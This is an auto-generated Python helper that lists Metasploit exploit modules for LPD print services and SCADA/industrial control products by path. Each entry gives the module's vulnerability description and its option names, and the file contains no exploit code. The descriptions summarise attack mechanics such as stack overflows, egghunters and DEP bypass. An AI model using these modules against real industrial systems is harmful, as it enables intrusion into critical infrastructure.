""" This is generated autocomplete helper class for MSF """
class exploit(object):
	class windows_lpd_niprint(object):
		"""
		
          This module exploits a stack buffer overflow in the
        Network Instrument NIPrint LPD service. Inspired by
        Immunity's VisualSploit :-)
      
		"""

		path = 'windows/lpd/niprint'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_lpd_wincomlpd_admin(object):
		"""
		
          This module exploits a stack buffer overflow in WinComLPD <= 3.0.2.
        By sending an overly long authentication packet to the remote
        adminstration service, an attacker may be able to execute arbitrary
        code.
      
		"""

		path = 'windows/lpd/wincomlpd_admin'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_lpd_saplpd(object):
		"""
		
          This module exploits a stack buffer overflow in SAPlpd 6.28 (SAP Release 6.40) .
        By sending an overly long argument, an attacker may be able to execute arbitrary
        code.
      
		"""

		path = 'windows/lpd/saplpd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_lpd_hummingbird_exceed(object):
		"""
		
          This module exploits a stack buffer overflow in Hummingbird Connectivity
        10 LPD Daemon. This module has only been tested against Hummingbird
        Exceed v10 with SP5.
      
		"""

		path = 'windows/lpd/hummingbird_exceed'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_igss9_igssdataserver_listall(object):
		"""
		
          This module exploits a vulnerability in the igssdataserver.exe component of 7-Technologies
        IGSS up to version 9.00.00 b11063. While processing a ListAll command, the application
        fails to do proper bounds checking before copying data into a small buffer on the stack.
        This causes a buffer overflow and allows to overwrite a structured exception handling record
        on the stack, allowing for unauthenticated remote code execution.  Also, after the payload
        exits, IGSSdataServer.exe should automatically recover.
      
		"""

		path = 'windows/scada/igss9_igssdataserver_listall'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_iconics_webhmi_setactivexguid(object):
		"""
		
          This module exploits a vulnerability found in ICONICS WebHMI's ActiveX control.
        By supplying a long string of data to the 'SetActiveXGUID' parameter, GenVersion.dll
        fails to do any proper bounds checking before this input is copied onto the stack,
        which causes a buffer overflow, and results arbitrary code execution under the context
        of the user.
      
		"""

		path = 'windows/scada/iconics_webhmi_setactivexguid'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_scada_iconics_genbroker(object):
		"""
		
          The GenBroker service on port 38080 is affected by three integer overflow
        vulnerabilities while handling opcode 0x4b0, which is caused by abusing the
        the memory allocations needed for the number of elements passed by the client.
        This results unexpected behaviors such as direct registry calls, memory location
        calls, or arbitrary remote code execution.  Please note that in order to ensure
        reliability, this exploit will try to open calc (hidden), inject itself into the
        process, and then open up a shell session.  Also, DEP bypass is supported.
      
		"""

		path = 'windows/scada/iconics_genbroker'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_igss9_igssdataserver_rename(object):
		"""
		
          This module exploits a vulnerability found on 7-Technologies IGSS 9. By supplying
        a long string of data to the 'Rename' (0x02), 'Delete' (0x03), or 'Add' (0x04) command,
        a buffer overflow condition occurs in IGSSdataServer.exe while handing an RMS report,
        which results arbitrary code execution under the context of the user.

        The attack is carried out in three stages.  The first stage sends the final payload to
        IGSSdataServer.exe, which will remain in memory.  The second stage sends the Add command
        so the process can find a valid ID for the Rename command.  The last stage then triggers
        the vulnerability with the Rename command, and uses an egghunter to search for the
        shellcode that we sent in stage 1.  The use of egghunter appears to be necessary due to
        the small buffer size, which cannot even contain our ROP chain and the final payload.
      
		"""

		path = 'windows/scada/igss9_igssdataserver_rename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_codesys_gateway_server_traversal(object):
		"""
		
          This module exploits a directory traversal vulnerability that allows arbitrary
        file creation, which can be used to execute a mof file in order to gain remote
        execution within the SCADA system.
      
		"""

		path = 'windows/scada/codesys_gateway_server_traversal'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_citect_scada_odbc(object):
		"""
		
        This module exploits a stack buffer overflow in CitectSCADA's ODBC daemon.
        This has only been tested against Citect v5, v6 and v7.
      
		"""

		path = 'windows/scada/citect_scada_odbc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_ge_proficy_cimplicity_gefebt(object):
		"""
		
        This module abuses the gefebt.exe component in GE Proficy CIMPLICITY, reachable through the
        CIMPLICIY CimWebServer. The vulnerable component allows to execute remote BCL files in
        shared resources. An attacker can abuse this behaviour to execute a malicious BCL and
        drop an arbitrary EXE. The last one can be executed remotely through the WebView server.
        This module has been tested successfully in GE Proficy CIMPLICITY 7.5 with the embedded
        CimWebServer. This module starts a WebDAV server to provide the malicious BCL files. If
        the target does not have the WebClient service enabled, an external SMB service is necessary.
      
		"""

		path = 'windows/scada/ge_proficy_cimplicity_gefebt'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			UNCPATH = 'UNCPATH'
			ONLYMAKE = 'ONLYMAKE'
			required_TARGETURI = 'TARGETURI'

	class windows_scada_daq_factory_bof(object):
		"""
		
          This module exploits a stack buffer overflow in Azeotech's DaqFactory
        product. The specfic vulnerability is triggered when sending a specially crafted
        'NETB' request to port 20034. Exploitation of this vulnerability may take a few
        seconds due to the use of egghunter.  This vulnerability was one of the 14
        releases discovered by researcher Luigi Auriemma.
      
		"""

		path = 'windows/scada/daq_factory_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_DHCP = 'DHCP'

	class windows_scada_igss9_misc(object):
		"""
		
          This module exploits multiple vulnerabilities found on IGSS 9's Data Server and
        Data Collector services.  The initial approach is first by transferring our binary
        with Write packets (opcode 0x0D) via port 12401 (igssdataserver.exe), and then send
        an EXE packet (opcode 0x0A) to port 12397 (dc.exe), which will cause dc.exe to run
        that payload with a CreateProcessA() function as a new thread.
      
		"""

		path = 'windows/scada/igss9_misc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_scada_factorylink_csservice(object):
		"""
		
          This module exploits a vulnerability found on Siemens FactoryLink 8. The
        vulnerability occurs when CSService.exe processes a CSMSG_ListFiles_REQ message,
        the user-supplied path first gets converted to ANSI format (CodePage 0), and then
        gets handled by a logging routine where proper bounds checking is not done,
        therefore causing a stack-based buffer overflow, and results arbitrary code execution.
      
		"""

		path = 'windows/scada/factorylink_csservice'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_realwin_scpc_initialize_rf(object):
		"""
		
          This module exploits a stack buffer overflow in DATAC Control
        International RealWin SCADA Server 2.0 (Build 6.1.8.10).
        By sending a specially crafted packet, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/scada/realwin_scpc_initialize_rf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_realwin(object):
		"""
		
          This module exploits a stack buffer overflow in DATAC Control
        International RealWin SCADA Server 2.0 (Build 6.0.10.37).
        By sending a specially crafted FC_INFOTAG/SET_CONTROL packet,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/scada/realwin'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_yokogawa_bkhodeq_bof(object):
		"""
		
        This module exploits a stack based buffer overflow in Yokogawa CENTUM CS 3000. The vulnerability
        exists in the service BKHOdeq.exe when handling specially crafted packets. This module has
        been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 over Windows XP SP3 and Windows
        2003 SP2.
      
		"""

		path = 'windows/scada/yokogawa_bkhodeq_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_realwin_scpc_initialize(object):
		"""
		
          This module exploits a stack buffer overflow in DATAC Control
        International RealWin SCADA Server 2.0 (Build 6.1.8.10).
        By sending a specially crafted packet, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/scada/realwin_scpc_initialize'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_indusoft_webstudio_exec(object):
		"""
		
          This module exploits a lack of authentication and authorization on the InduSoft
        Web Studio Remote Agent, that allows a remote attacker to write arbitrary files to
        the filesystem, by abusing the functions provided by the software.

        The module uses uses the Windows Management Instrumentation service to execute an
        arbitrary payload on vulnerable installations of InduSoft Web Studio on Windows pre
        Vista. It has been successfully tested on InduSoft Web Studio 6.1 SP6 over Windows
        XP SP3 and Windows 2003 SP2.
      
		"""

		path = 'windows/scada/indusoft_webstudio_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_scada_procyon_core_server(object):
		"""
		
          This module exploits a vulnerability in the coreservice.exe component of Proycon
        Core Server <= v1.13. While processing a password, the application
        fails to do proper bounds checking before copying data into a small buffer on the stack.
        This causes a buffer overflow and allows to overwrite a structured exception handling
        record on the stack, allowing for unauthenticated remote code execution.  Also, after the
        payload exits, Coreservice.exe should automatically recover.
      
		"""

		path = 'windows/scada/procyon_core_server'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_realwin_on_fc_binfile_a(object):
		"""
		
          This module exploits a vulnerability found in DATAC Control International RealWin
        SCADA Server 2.1 and below. By supplying a specially crafted On_FC_BINFILE_FCS_*FILE
        packet via port 910, RealWin will try to create a file (which would be saved to
        C:/Program Files/DATAC/Real Win/RW-version/filename) by first copying the user-
        supplied filename with a inline memcpy routine without proper bounds checking, which
        results a stack-based buffer overflow, allowing arbitrary remote code execution.

        Tested version: 2.0 (Build 6.1.8.10)
      
		"""

		path = 'windows/scada/realwin_on_fc_binfile_a'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_realwin_on_fcs_login(object):
		"""
		
          This module exploits a stack buffer overflow in DATAC Control
        International RealWin SCADA Server 2.1 (Build 6.0.10.10) or
        earlier.  By sending a specially crafted On_FC_CONNECT_FCS_LOGIN
        packet containing a long username, an attacker may be able to
        execute arbitrary code.
      
		"""

		path = 'windows/scada/realwin_on_fcs_login'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_winlog_runtime(object):
		"""
		
          This module exploits a buffer overflow in Sielco
        Sistem Winlog <= 2.07.00. When sending a specially formatted
        packet to the Runtime.exe service, an attacker may be able to
        execute arbitrary code.
      
		"""

		path = 'windows/scada/winlog_runtime'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_codesys_web_server(object):
		"""
		
        This module exploits a remote stack buffer overflow vulnerability in
        3S-Smart Software Solutions product CoDeSys Scada Web Server Version
        1.1.9.9. This vulnerability affects versions 3.4 SP4 Patch 2 and
        earlier.
      
		"""

		path = 'windows/scada/codesys_web_server'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
